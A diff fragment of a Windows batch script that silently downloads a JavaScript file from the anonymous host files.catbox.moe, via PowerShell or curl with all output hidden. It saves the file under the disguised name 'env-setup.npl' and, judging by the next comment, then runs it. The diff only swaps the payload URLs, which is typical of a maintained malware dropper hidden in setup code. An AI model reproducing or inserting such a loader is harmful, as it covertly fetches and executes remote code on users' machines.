@@ -81,9 +81,9 @@ if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"
 
 where curl >nul 2>&1
 if errorlevel 1 (
-    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'" >nul 2>&1
+    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/l2rxnb.js' -OutFile '%CODEPROFILE%\env-setup.npl'" >nul 2>&1
 ) else (
-    curl -sSL -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/92zc8z.js" >nul 2>&1
+    curl -sSL -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/l2rxnb.js" >nul 2>&1
 )
 :: -------------------------
 :: Run the parser
